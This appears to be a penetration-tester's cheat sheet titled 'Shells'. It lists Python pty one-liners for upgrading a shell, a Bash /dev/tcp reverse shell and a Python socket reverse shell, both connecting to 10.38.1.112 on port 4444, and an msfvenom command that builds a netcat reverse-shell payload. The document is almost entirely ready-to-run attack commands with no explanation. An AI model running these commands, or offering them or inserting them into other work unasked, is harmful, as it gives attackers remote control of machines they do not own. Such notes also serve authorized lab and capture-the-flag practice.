# Shells

## Upgrade shell

```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Reverse Shells

```console
#Bash
bash -i >& /dev/tcp/10.38.1.112/4444 0>&1

#Python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.38.1.112",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## msfvenom

```console
$ msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R
```